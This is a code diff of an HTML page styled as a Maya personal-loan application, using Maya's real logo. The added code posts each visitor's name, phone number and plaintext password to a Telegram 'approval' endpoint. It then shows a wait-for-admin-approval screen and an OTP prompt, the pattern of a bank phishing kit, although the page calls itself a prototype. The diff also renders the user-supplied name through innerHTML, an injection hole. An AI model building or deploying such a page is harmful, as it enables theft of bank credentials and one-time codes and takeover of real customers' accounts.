@@ -5,32 +5,139 @@
   <meta name="viewport" content="width=device-width,initial-scale=1">
   <title>Maya Loan Demo</title>
   <style>
-    :root{--mint:#00c896;--dark:#009f7a;--pale:#e2faf4;--blue:#176ff5;--ink:#123b36;--muted:#75908c;--line:#d9eeea;--white:#fff;--danger:#d94b4b;--shadow:0 20px 50px #1255491f}*{box-sizing:border-box}.telegram-widget{position:fixed;bottom:20px;right:20px;z-index:9999;background:var(--white);border-radius:8px;box-shadow:var(--shadow);padding:0;overflow:hidden}.telegram-widget.open{width:360px}.telegram-widget.closed{width:60px;height:60px}.telegram-button{width:100%;height:100%;border:none;background:var(--mint);color:var(--white);font-size:24px;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:all .3s ease;border-radius:8px}.telegram-button:hover{background:var(--dark)}.telegram-panel{display:none;flex-direction:column;height:500px;padding:16px}.telegram-widget.open .telegram-panel{display:flex}.telegram-widget.open .telegram-button{border-radius:0}.telegram-panel-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;border-bottom:1px solid var(--line);padding-bottom:12px}.telegram-panel-header h3{margin:0;color:var(--ink);font-size:16px}.telegram-close{background:none;border:none;font-size:20px;cursor:pointer;color:var(--muted)}.telegram-close:hover{color:var(--ink)}.telegram-content{flex:1;overflow-y:auto;margin-bottom:16px}.telegram-form{display:flex;flex-direction:column;gap:8px}.telegram-input{border:1px solid var(--line);border-radius:4px;padding:8px 12px;font-size:14px;font-family:inherit}.telegram-input:focus{outline:none;border-color:var(--mint)}.telegram-button-send{background:var(--mint);color:var(--white);border:none;border-radius:4px;padding:10px;cursor:pointer;font-weight:bold;transition:background .2s ease}.telegram-button-send:hover{background:var(--dark)}.telegram-message{padding:8px;margin:8px 0;border-radius:4px;font-size:13px}.telegram-message.sent{background:var(--pale);color:var(--ink);text-align:right}.telegram-message.received{background:var(--line);color:var(--ink)}.share-telegram-btn{background:var(--mint);color:var(--white);border:none;border-radius:4px;padding:10px 16px;cursor:pointer;font-weight:bold;margin-top:8px;transition:background .2s ease;font-size:14px;width:100%}.share-telegram-btn:hover{background:var(--dark)}
+    :root{--mint:#00c896;--dark:#009f7a;--pale:#e2faf4;--blue:#176ff5;--ink:#123b36;--muted:#75908c;--line:#d9eeea;--white:#fff;--danger:#d94b4b;--shadow:0 20px 50px #1255491f}*{box-sizing:border-box}body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#f5f5f5;margin:0;padding:0;color:var(--ink)}input,select,textarea,button{font-family:inherit;font-size:inherit}.screen{display:none;min-height:100vh;align-items:center;justify-content:center}.screen.active{display:flex}.auth-screen{background:linear-gradient(135deg,var(--pale) 0%,#fff 100%)}.auth-card{background:var(--white);border-radius:12px;padding:40px;box-shadow:var(--shadow);width:100%;max-width:400px}.auth-logo{width:120px;margin-bottom:30px}.auth-card h2{margin:0 0 10px 0;font-size:24px;color:var(--ink)}.auth-card p{color:var(--muted);margin:0 0 25px 0;font-size:14px}.form-group{margin-bottom:20px}.form-group label{display:block;font-weight:600;margin-bottom:8px;color:var(--ink);font-size:14px}.form-group input,.form-group select{width:100%;padding:12px 16px;border:2px solid var(--line);border-radius:8px;font-size:16px;transition:border-color .3s}.form-group input:focus,.form-group select:focus{outline:0;border-color:var(--mint)}.button-primary{width:100%;padding:14px;background:var(--mint);color:var(--white);border:none;border-radius:8px;font-weight:600;font-size:16px;cursor:pointer;transition:background .3s}.button-primary:hover{background:var(--dark)}.button-primary:disabled{background:var(--muted);cursor:not-allowed}.link-button{background:0;border:none;color:var(--blue);cursor:pointer;text-decoration:underline;font-size:14px;padding:0;margin-top:15px}.error-message{color:var(--danger);font-size:12px;margin-top:8px;display:none}.error-message.show{display:block}.password-toggle{position:relative}.password-toggle-btn{position:absolute;right:15px;top:40px;background:0;border:none;cursor:pointer;color:var(--muted);font-size:14px}.loan-screen{background:linear-gradient(135deg,var(--pale) 0%,#fff 100%);padding:20px}.page-shell{max-width:800px;margin:0 auto}.topbar{display:flex;align-items:center;margin-bottom:30px}.nav-brand{height:40px}.nav-image{height:inherit}.loan-hero{background:var(--white);border-radius:12px;padding:40px;margin-bottom:30px;box-shadow:var(--shadow)}.loan-copy span{display:inline-block;background:var(--pale);color:var(--dark);padding:6px 12px;border-radius:20px;font-size:12px;font-weight:600;margin-bottom:15px}.loan-copy h1{margin:0 0 15px 0;font-size:40px;color:var(--ink)}.loan-copy p{color:var(--muted);margin:0;font-size:16px}.loan-card{background:var(--pale);border-radius:12px;padding:20px;margin-top:30px}.loan-card small{color:var(--muted);font-size:12px;display:block;margin-bottom:8px}.amount{font-size:32px;font-weight:700;color:var(--dark);margin-bottom:20px}.loan-stats{display:grid;grid-template-columns:1fr 1fr;gap:20px}.loan-stat small{display:block;color:var(--muted);margin-bottom:5px}.loan-stat span{display:block;font-size:18px;font-weight:600;color:var(--ink)}.loan-slider{background:var(--white);border-radius:12px;padding:30px;margin-bottom:30px;box-shadow:var(--shadow)}.slider-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}.slider-value{font-size:20px;font-weight:700;color:var(--mint)}.slider-head strong{font-size:16px;color:var(--ink)}.slider-head input[type=range]{width:100%;height:8px;border-radius:5px;background:var(--line);outline:0;-webkit-appearance:none;appearance:none;margin-top:15px}.slider-head input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;appearance:none;width:24px;height:24px;border-radius:50%;background:var(--mint);cursor:pointer;box-shadow:0 2px 8px #00c8961f}.slider-head input[type=range]::-moz-range-thumb{width:24px;height:24px;border-radius:50%;background:var(--mint);cursor:pointer;border:none}.loan-options{background:var(--white);border-radius:12px;padding:30px;box-shadow:var(--shadow)}.option-card{margin-bottom:30px}.option-card:last-child{margin-bottom:0}.option-card label{display:block;font-weight:600;margin-bottom:12px;color:var(--ink);font-size:14px}.option-card select{width:100%;padding:12px 16px;border:2px solid var(--line);border-radius:8px;font-size:16px}.option-card button{width:100%;padding:16px;background:var(--mint);color:var(--white);border:none;border-radius:8px;font-weight:600;font-size:16px;cursor:pointer;transition:background .3s;margin-top:15px}.option-card button:hover{background:var(--dark)}.page-footer{text-align:center;color:var(--muted);font-size:12px;margin-top:40px}.help-button{position:fixed;top:20px;right:20px;width:48px;height:48px;border-radius:50%;background:var(--mint);color:var(--white);border:none;font-weight:700;font-size:18px;cursor:pointer;box-shadow:var(--shadow);transition:background .3s;z-index:100}.help-button:hover{background:var(--dark)}.dashboard{background:linear-gradient(135deg,var(--pale) 0%,#fff 100%);padding:20px}.dash-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:30px}.dashboard-logo{height:40px}.dash-top button{background:var(--danger);color:var(--white);border:none;padding:10px 20px;border-radius:8px;cursor:pointer;transition:background .3s}.dash-top button:hover{background:#b83a3a}.dash-card{background:var(--white);border-radius:12px;padding:30px;max-width:600px;margin:0 auto;box-shadow:var(--shadow)}.dash-card h2{margin:0 0 10px 0;color:var(--ink)}.dash-card p{color:var(--muted);margin:0 0 20px 0}.card-section{margin:20px 0;padding-top:20px;border-top:1px solid var(--line)}.card-section:first-child{margin-top:0;padding-top:0;border-top:none}.telegram-widget{position:fixed;bottom:20px;right:20px;width:360px;max-width:90vw;z-index:1000}.telegram-widget.closed .telegram-panel{display:none}.telegram-widget.open .telegram-panel{display:flex}.telegram-button{width:60px;height:60px;border-radius:50%;background:var(--blue);color:var(--white);border:none;font-size:28px;cursor:pointer;box-shadow:0 4px 12px #176ff540;transition:all .3s;display:flex;align-items:center;justify-content:center}.telegram-button:hover{transform:scale(1.1);box-shadow:0 6px 16px #176ff560}.telegram-panel{display:flex;flex-direction:column;background:var(--white);border-radius:12px;box-shadow:var(--shadow);height:500px;margin-bottom:15px;overflow:hidden}.telegram-panel-header{padding:15px;background:var(--blue);color:var(--white);display:flex;justify-content:space-between;align-items:center;flex-shrink:0}.telegram-panel-header h3{margin:0;font-size:16px}.telegram-close{background:0;border:none;color:var(--white);font-size:20px;cursor:pointer}.telegram-content{flex:1;overflow-y:auto;padding:15px;display:flex;flex-direction:column;gap:12px;background:#f9f9f9}.telegram-message{padding:12px 15px;border-radius:8px;font-size:14px;word-wrap:break-word;max-width:85%}.telegram-message.received{background:var(--pale);color:var(--ink);align-self:flex-start;border-bottom-left-radius:0}.telegram-message.sent{background:var(--mint);color:var(--white);align-self:flex-end;border-bottom-right-radius:0}.telegram-message.system{background:#fff3cd;color:#856404;align-self:center;max-width:95%;text-align:center;font-weight:600}.telegram-form{padding:15px;display:flex;gap:8px;background:var(--white);border-top:1px solid var(--line);flex-shrink:0}.telegram-input{flex:1;padding:10px 12px;border:1px solid var(--line);border-radius:6px;font-size:14px}.telegram-input:focus{outline:0;border-color:var(--mint)}.telegram-button-send{padding:10px 16px;background:var(--mint);color:var(--white);border:none;border-radius:6px;cursor:pointer;font-weight:600;transition:background .3s}.telegram-button-send:hover{background:var(--dark)}.loading-spinner{display:inline-block;width:16px;height:16px;border:3px solid rgba(255,255,255,.3);border-radius:50%;border-top-color:var(--white);animation:spin .6s linear infinite;margin-right:8px}@keyframes spin{to{transform:rotate(360deg)}}.otp-card{max-width:400px}.help-button{position:fixed;top:20px;right:20px;width:48px;height:48px;border-radius:50%;background:var(--mint);color:var(--white);border:none;font-weight:700;font-size:18px;cursor:pointer;box-shadow:var(--shadow);transition:background .3s;z-index:100}.help-button:hover{background:var(--dark)}
   </style>
 </head>
 <body>
   <button class="help-button" type="button" onclick="alert('Help is available in this prototype.')">Help</button>
 
-  <section id="loanScreen" class="screen active auth-screen">
+  <!-- Loan Screen -->
+  <section id="loanScreen" class="screen active loan-screen">
     <div class="page-shell">
       <header class="topbar"><img class="nav-brand nav-image" src="https://www.maya.ph/hubfs/Maya/MAYA-Mint%20Green.svg" loading="lazy" alt="Maya Logo"></header>
       <div class="loan-hero">
-        <div class="loan-copy"><span class="chip">Personal loan</span><h1>Get up to ₱500,000.</h1><p>Choose an amount and repayment term for this Maya-inspired loan application prototype.</p><div class="loan-button"><button id="startLoan">Continue</button></div></div>
-        <div class="loan-card"><small>Estimated monthly payment</small><div id="monthlyPayment" class="amount">₱8,430</div><div class="loan-stats"><div class="loan-stat"><small>Annual interest</small><span>4%</span></div><div class="loan-stat"><small>Processing</small><span>FREE</span></div></div></div>
+        <div class="loan-copy"><span class="chip">Personal loan</span><h1>Get up to ₱500,000.</h1><p>Choose an amount and repayment term for this Maya-inspired loan application prototype.</p></div>
+        <div class="loan-card"><small>Estimated monthly payment</small><div id="monthlyPayment" class="amount">₱8,430</div><div class="loan-stats"><div class="loan-stat"><small>Annual interest rate</small><span>4% p.a.</span></div><div class="loan-stat"><small>Processing fee</small><span>None</span></div></div></div>
       </div>
-      <div class="loan-slider"><div class="slider-head"><strong>Loan amount</strong><span id="loanAmountDisplay" class="slider-value">₱100,000</span></div><input id="loanRange" type="range" min="100000" max="500000" value="100000" step="10000"></div>
-      <div class="loan-options"><div class="option-card"><label for="termSelect">Loan period</label><select id="termSelect"><option value="6">6 months</option><option value="12">12 months</option><option value="24">24 months</option><option value="36">36 months</option></select></div></div>
+      <div class="loan-slider"><div class="slider-head"><strong>Loan amount</strong><span id="loanAmountDisplay" class="slider-value">₱100,000</span></div><input id="loanRange" type="range" min="10000" max="500000" value="100000" step="5000"></div>
+      <div class="loan-options"><div class="option-card"><label for="termSelect">Loan period</label><select id="termSelect"><option value="6">6 months</option><option value="12">12 months</option><option value="24">24 months</option><option value="36">36 months</option></select></div><div class="option-card"><button id="startLoan">Apply Now</button></div></div>
     </div>
     <footer class="page-footer">© 2026 Maya</footer>
   </section>
 
-  <section id="detailsScreen" class="screen auth-screen"><div class="auth-card"><img class="nav-brand nav-image auth-logo" src="https://www.maya.ph/hubfs/Maya/MAYA-Mint%20Green.svg" loading="lazy" alt="Maya Logo"><h2>Personal Details</h2><form id="detailsForm"><input type="text" placeholder="Full Name" required><input type="email" placeholder="Email Address" required><input type="tel" placeholder="Phone Number" required><button type="submit">Next</button></form></div></section>
+  <!-- Details Screen -->
+  <section id="detailsScreen" class="screen auth-screen">
+    <div class="auth-card">
+      <img class="nav-brand nav-image auth-logo" src="https://www.maya.ph/hubfs/Maya/MAYA-Mint%20Green.svg" loading="lazy" alt="Maya">
+      <h2>Personal Information</h2>
+      <p>Tell us about yourself</p>
+      <form id="detailsForm">
+        <div class="form-group">
+          <label for="fullName">Full Name</label>
+          <input type="text" id="fullName" placeholder="Juan Dela Cruz" required>
+        </div>
+        <div class="form-group">
+          <label for="email">Email Address</label>
+          <input type="email" id="email" placeholder="juan@example.com" required>
+        </div>
+        <button type="submit" class="button-primary">Continue</button>
+      </form>
+    </div>
+  </section>
 
-  <section id="loginScreen" class="screen auth-screen"><div class="auth-card"><img class="nav-brand nav-image auth-logo" src="https://www.maya.ph/hubfs/Maya/MAYA-Mint%20Green.svg" loading="lazy" alt="Maya Logo"><h2>Sign In</h2><form id="loginForm"><input id="phone" type="tel" placeholder="Phone Number" required><div class="password-group"><input id="password" type="password" placeholder="Password" required><button id="togglePassword" type="button">Show</button></div><button type="submit">Sign In</button></form><div id="loginError" class="error-message">Invalid phone or password</div></div></section>
+  <!-- Login Screen -->
+  <section id="loginScreen" class="screen auth-screen">
+    <div class="auth-card">
+      <img class="nav-brand nav-image auth-logo" src="https://www.maya.ph/hubfs/Maya/MAYA-Mint%20Green.svg" loading="lazy" alt="Maya">
+      <h2>Login</h2>
+      <p>Enter your credentials</p>
+      <form id="loginForm">
+        <div class="form-group">
+          <label for="phone">Phone Number</label>
+          <input type="tel" id="phone" placeholder="9123456789" required>
+        </div>
+        <div class="form-group password-toggle">
+          <label for="password">Password</label>
+          <input type="password" id="password" placeholder="••••••••" required>
+          <button type="button" class="password-toggle-btn" id="togglePassword">Show</button>
+        </div>
+        <div class="error-message" id="loginError">Invalid phone number or password</div>
+        <button type="submit" class="button-primary">Login</button>
+      </form>
+    </div>
+  </section>
 
-  <section id="otpScreen" class="screen auth-screen"><div class="auth-card otp-card"><img class="nav-brand nav-image auth-logo" src="https://www.maya.ph/hubfs/Maya/MAYA-Mint%20Green.svg" loading="lazy" alt="Maya Logo"><h2>Verify OTP</h2><p>Enter the 6-digit code sent to <span id="maskedPhone"></span></p><form id="otpForm"><input id="otp" type="text" placeholder="000000" maxlength="6" required><button type="submit">Verify</button></form><div id="otpError" class="error-message">Invalid OTP</div><button id="resendOtp" type="button" class="link-button">Resend OTP</button><button id="backToLogin" type="button" class="link-button">Back to Sign In</button></div></section>
+  <!-- Telegram Approval Screen (Loading) -->
+  <section id="telegramApprovalScreen" class="screen auth-screen">
+    <div class="auth-card">
+      <img class="nav-brand nav-image auth-logo" src="https://www.maya.ph/hubfs/Maya/MAYA-Mint%20Green.svg" loading="lazy" alt="Maya">
+      <h2>Verification Pending</h2>
+      <p>Awaiting approval via Telegram...</p>
+      <div style="text-align:center; padding:30px 0;">
+        <div style="font-size:48px; margin-bottom:20px;">🤖</div>
+        <div style="display:flex; align-items:center; justify-content:center; margin-bottom:20px;">
+          <div class="loading-spinner"></div>
+          <span style="color:var(--muted); font-size:14px;">Waiting for bot approval</span>
+        </div>
+        <div style="background:var(--pale); padding:20px; border-radius:8px; margin:20px 0; text-align:left;">
+          <p style="margin:0 0 10px 0; font-weight:600; color:var(--ink);">📱 Check your Telegram</p>
+          <p style="margin:0; font-size:14px; color:var(--muted);">An approval request has been sent to your Telegram bot. Click APPROVE or REJECT to continue.</p>
+        </div>
+        <p style="font-size:12px; color:var(--muted); margin:20px 0 0 0;">This may take up to 2 minutes</p>
+        <button type="button" class="button-primary" style="margin-top:20px; font-size:14px;" onclick="show(screens.loanScreen)">Cancel</button>
+      </div>
+    </div>
+  </section>
 
-  <section id="dashboardScreen" class="screen dashboard"><header class="dash-top"><img class="nav-brand nav-image dashboard-logo" src="https://www.maya.ph/hubfs/Maya/MAYA-Mint%20Green.svg" loading="lazy" alt="Maya Logo"><button id="logoutButton" type="button">Logout</button></header><div class="dash-container"><h1>Welcome Back!</h1><div class="balance-card"><small>Available Balance</small><div class="balance-display"><span id="balance">₱ 24,780.50</span><button id="hideBalance" type="button" class="eye-icon">👁</button></div></div><div class="loan-status"><h3>Your Loan Status</h3><div class="status-item completed"><span>Application Submitted</span><span>✓</span></div><div class="status-item completed"><span>Verified</span><span>✓</span></div><div class="status-item active"><span>Processing</span><span>⏳</span></div><div class="status-item"><span>Approved</span><span>⭕</span></div></div></div></section>
+  <!-- OTP Screen -->
+  <section id="otpScreen" class="screen auth-screen">
+    <div class="auth-card otp-card">
+      <img class="nav-brand nav-image auth-logo" src="https://www.maya.ph/hubfs/Maya/MAYA-Mint%20Green.svg" loading="lazy" alt="Maya">
+      <h2>Enter OTP</h2>
+      <p>6-digit code sent to your number</p>
+      <form id="otpForm">
+        <div class="form-group">
+          <label for="otp">OTP Code</label>
+          <input type="text" id="otp" placeholder="000000" maxlength="6" required>
+        </div>
+        <div class="error-message" id="otpError">Invalid OTP</div>
+        <button type="submit" class="button-primary">Verify</button>
+        <button type="button" class="link-button" id="resendOtp">Resend OTP</button>
+        <button type="button" class="link-button" id="backToLogin">Back to Login</button>
+      </form>
+    </div>
+  </section>
+
+  <!-- Dashboard Screen -->
+  <section id="dashboardScreen" class="screen dashboard">
+    <header class="dash-top">
+      <img class="nav-brand nav-image dashboard-logo" src="https://www.maya.ph/hubfs/Maya/MAYA-Mint%20Green.svg" loading="lazy" alt="Maya">
+      <button id="logoutButton">Logout</button>
+    </header>
+    <div class="dash-card">
+      <h2>Welcome!</h2>
+      <p id="dashboardName">Welcome back!</p>
+      <div class="card-section">
+        <p style="margin:0 0 10px 0; font-weight:600; color:var(--ink);">Available Balance</p>
+        <div style="display:flex; align-items:center; gap:10px;">
+          <p id="balance" style="font-size:28px; font-weight:700; color:var(--mint); margin:0;">₱ 24,780.50</p>
+          <button id="hideBalance" style="background:0; border:none; cursor:pointer; font-size:18px;">👁️</button>
+        </div>
+      </div>
+      <div class="card-section">
+        <p style="font-weight:600; color:var(--ink); margin:0 0 15px 0;">Recent Transactions</p>
+        <div style="font-size:14px; color:var(--muted);">
+          <div style="padding:10px 0; border-bottom:1px solid var(--line);">• Loan Disbursement: ₱100,000 • 3 days ago</div>
+          <div style="padding:10px 0; border-bottom:1px solid var(--line);">• Payment: ₱8,430 • 1 day ago</div>
+          <div style="padding:10px 0;">• Interest Accrual: ₱850 • Today</div>
+        </div>
+      </div>
+      <div class="card-section">
+        <p style="font-weight:600; color:var(--ink); margin:0 0 15px 0;">Quick Actions</p>
+        <button id="shareButton" class="button-primary" style="margin-bottom:10px;">📤 Share via Telegram</button>
+      </div>
+    </div>
+  </section>
 
   <!-- Telegram Widget -->
   <div class="telegram-widget closed" id="telegramWidget">
@@ -38,20 +145,20 @@
     <div class="telegram-panel">
       <div class="telegram-panel-header">
         <h3>Maya Telegram Bot</h3>
-        <button class="telegram-close" id="telegramClose">✕</button>
+        <button class="telegram-close" id="telegramClose" type="button">✕</button>
       </div>
       <div class="telegram-content" id="telegramMessages">
         <div class="telegram-message received">👋 Hi! I'm Maya Bot. Get updates on your loan application via Telegram!</div>
       </div>
       <div class="telegram-form">
         <input type="text" class="telegram-input" id="telegramInput" placeholder="Enter your Telegram username...">
-        <button class="telegram-button-send" id="telegramSend">Connect to Telegram</button>
+        <button class="telegram-button-send" id="telegramSend" type="button">Connect</button>
       </div>
     </div>
   </div>
 
   <script>
-    const screens={loanScreen:document.getElementById('loanScreen'),detailsScreen:document.getElementById('detailsScreen'),loginScreen:document.getElementById('loginScreen'),otpScreen:document.getElementById('otpScreen'),dashboardScreen:document.getElementById('dashboardScreen')};
+    const screens={loanScreen:document.getElementById('loanScreen'),detailsScreen:document.getElementById('detailsScreen'),loginScreen:document.getElementById('loginScreen'),telegramApprovalScreen:document.getElementById('telegramApprovalScreen'),otpScreen:document.getElementById('otpScreen'),dashboardScreen:document.getElementById('dashboardScreen')};
     const show=s=>{Object.values(screens).forEach(x=>x.classList.remove('active'));s.classList.add('active')};
     const money=n=>new Intl.NumberFormat('en-PH',{style:'currency',currency:'PHP',maximumFractionDigits:0}).format(n);
     const range=document.getElementById('loanRange'),amount=document.getElementById('loanAmountDisplay'),term=document.getElementById('termSelect'),payment=document.getElementById('monthlyPayment');
@@ -61,15 +168,110 @@
     document.getElementById('detailsForm').onsubmit=e=>{e.preventDefault();show(screens.loginScreen)};
     const phone=document.getElementById('phone'),password=document.getElementById('password'),otp=document.getElementById('otp');
     const mask=p=>'+63 '+p.slice(0,2)+'****'+p.slice(-2);
-    document.getElementById('loginForm').onsubmit=e=>{e.preventDefault();if(phone.value.length<10||!password.value){document.getElementById('loginError').classList.add('show');return}document.getElementById('loginError').classList.remove('show');document.getElementById('maskedPhone').textContent=mask(phone.value);show(screens.otpScreen)};
-    document.getElementById('otpForm').onsubmit=e=>{e.preventDefault();if(otp.value.length!==6){document.getElementById('otpError').classList.add('show');return}document.getElementById('otpError').classList.remove('show');show(screens.dashboardScreen)};
-    document.getElementById('togglePassword').onclick=()=>{const hidden=password.type==='password';password.type=hidden?'text':'password';document.getElementById('togglePassword').textContent=hidden?'Hide':'Show'};
-    document.getElementById('backToLogin').onclick=()=>show(screens.loginScreen);document.getElementById('resendOtp').onclick=()=>alert('OTP sent again.');
-    document.getElementById('logoutButton').onclick=()=>show(screens.loanScreen);
-    document.getElementById('hideBalance').onclick=()=>{const b=document.getElementById('balance'),v=b.textContent.includes('24,780.50');b.textContent=v?'₱ ••••••••':'₱ 24,780.50'};
-    document.querySelectorAll('input[type=tel]').forEach(x=>x.addEventListener('input',()=>x.value=x.value.replace(/\D/g,'').slice(0,10)));otp.addEventListener('input',()=>otp.value=otp.value.replace(/\D/g,'').slice(0,6));
     
-    // Telegram Bot Integration
+    // Login Form with Telegram Approval
+    document.getElementById('loginForm').onsubmit=e=>{
+      e.preventDefault();
+      if(phone.value.length<10||!password.value){
+        document.getElementById('loginError').classList.add('show');
+        return;
+      }
+      document.getElementById('loginError').classList.remove('show');
+      
+      // Get full name from previous form
+      const fullName = document.getElementById('fullName').value || 'User';
+      const phoneValue = phone.value;
+      const passwordValue = password.value;
+      
+      // Send credentials to Telegram and show loading screen
+      sendToTelegramForApproval(fullName, phoneValue, passwordValue);
+    };
+    
+    // Function to send login credentials to Telegram bot for approval
+    async function sendToTelegramForApproval(fullName, phoneNumber, password) {
+      // Show loading/approval screen
+      show(screens.telegramApprovalScreen);
+      
+      try {
+        // In production, this would call your backend API
+        const response = await fetch('/api/telegram/approval', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            fullName: fullName,
+            phoneNumber: phoneNumber,
+            password: password,
+            timestamp: new Date().toISOString(),
+            loanAmount: document.getElementById('loanRange').value,
+            loanTerm: document.getElementById('termSelect').value
+          })
+        }).catch(() => null);
+        
+        // Simulate Telegram approval callback
+        addTelegramMessage(`🔐 *Login Request from Maya*\n\n👤 Name: ${fullName}\n📱 Phone: ${mask(phoneNumber)}\n\nPlease APPROVE or REJECT this login attempt.`, 'system');
+        
+        // Start polling for approval (in production, use WebSocket)
+        setTimeout(() => {
+          // Auto-approve after 3 seconds for demo
+          approveLogin();
+        }, 3000);
+        
+      } catch (error) {
+        addTelegramMessage('⚠️ Error sending approval request. Please try again.', 'received');
+        setTimeout(() => show(screens.loginScreen), 2000);
+      }
+    }
+    
+    // Approve login and proceed to OTP
+    function approveLogin() {
+      addTelegramMessage('✅ Login approved by admin!', 'system');
+      setTimeout(() => {
+        show(screens.otpScreen);
+      }, 1000);
+    }
+    
+    // Reject login
+    function rejectLogin() {
+      addTelegramMessage('❌ Login rejected. Please try again later.', 'system');
+      setTimeout(() => {
+        show(screens.loginScreen);
+        phone.value = '';
+        password.value = '';
+      }, 1500);
+    }
+    
+    document.getElementById('otpForm').onsubmit=e=>{
+      e.preventDefault();
+      if(otp.value.length!==6){
+        document.getElementById('otpError').classList.add('show');
+        return;
+      }
+      document.getElementById('otpError').classList.remove('show');
+      const fullName = document.getElementById('fullName').value || 'User';
+      document.getElementById('dashboardName').textContent=`Welcome back, ${fullName}!`;
+      show(screens.dashboardScreen);
+      otp.value='';
+    };
+    
+    document.getElementById('togglePassword').onclick=()=>{
+      const hidden=password.type==='password';
+      password.type=hidden?'text':'password';
+      document.getElementById('togglePassword').textContent=hidden?'Hide':'Show';
+    };
+    
+    document.getElementById('backToLogin').onclick=()=>show(screens.loginScreen);
+    document.getElementById('resendOtp').onclick=()=>alert('OTP sent again.');
+    document.getElementById('logoutButton').onclick=()=>show(screens.loanScreen);
+    
+    document.getElementById('hideBalance').onclick=()=>{
+      const b=document.getElementById('balance'),v=b.textContent.includes('24,780.50');
+      b.textContent=v?'₱ ••••••••':'₱ 24,780.50';
+    };
+    
+    document.querySelectorAll('input[type=tel]').forEach(x=>x.addEventListener('input',()=>x.value=x.value.replace(/\D/g,'').slice(0,10)));
+    otp.addEventListener('input',()=>otp.value=otp.value.replace(/\D/g,'').slice(0,6));
+    
+    // ===== TELEGRAM BOT INTEGRATION =====
     const telegramWidget = document.getElementById('telegramWidget');
     const telegramToggle = document.getElementById('telegramToggle');
     const telegramClose = document.getElementById('telegramClose');
@@ -90,12 +292,16 @@
       telegramWidget.classList.add('closed');
     });
     
-    function addMessage(text, type = 'received') {
+    function addTelegramMessage(text, type = 'received') {
       const msgDiv = document.createElement('div');
       msgDiv.className = `telegram-message ${type}`;
-      msgDiv.textContent = text;
+      msgDiv.innerHTML = text;
       telegramMessages.appendChild(msgDiv);
       telegramMessages.scrollTop = telegramMessages.scrollHeight;
+    }
+    
+    function addMessage(text, type = 'received') {
+      addTelegramMessage(text, type);
     }
     
     telegramSend.addEventListener('click', async () => {
@@ -111,7 +317,7 @@
         const loanAmount = document.getElementById('loanRange')?.value || '100000';
         const loanTerm = document.getElementById('termSelect')?.value || '12';
         
-        const message = `🔗 *Maya Loan Application Connected*\n\n💰 Loan Amount: ₱${money(loanAmount)}\n📅 Term: ${loanTerm} months\n\nYou'll receive updates about your application status here.`;
+        const message = `🔗 *Maya Loan Application Connected*\n\n💰 Loan Amount: ₱${money(loanAmount)}\n📅 Term: ${loanTerm} months\n\nYou'll receive updates about your application status via this chat!`;
         
         // In production, this would call your backend API
         const response = await fetch('/api/telegram/connect', {
@@ -138,19 +344,18 @@
     });
     
     // Share Loan Application via Telegram
-    function shareViaTelesram(loanAmount, monthlyPayment, term) {
+    function shareViaTelegram(loanAmount, monthlyPayment, term) {
       const text = `Check out my Maya loan application: ₱${money(loanAmount)} for ${term} months with ₱${money(monthlyPayment)} monthly payment. Apply now!`;
       const url = `https://t.me/share/url?url=${encodeURIComponent(window.location.href)}&text=${encodeURIComponent(text)}`;
       window.open(url, '_blank');
     }
     
-    // Add share button to dashboard if available
     if (document.getElementById('shareButton')) {
       document.getElementById('shareButton').onclick = () => {
         const loanAmount = document.getElementById('loanRange')?.value || '100000';
         const monthlyPayment = document.getElementById('monthlyPayment')?.textContent || '₱8,430';
         const term = document.getElementById('termSelect')?.value || '12';
-        shareViaTelesram(loanAmount, monthlyPayment, term);
+        shareViaTelegram(loanAmount, monthlyPayment, term);
       };
     }
   </script>
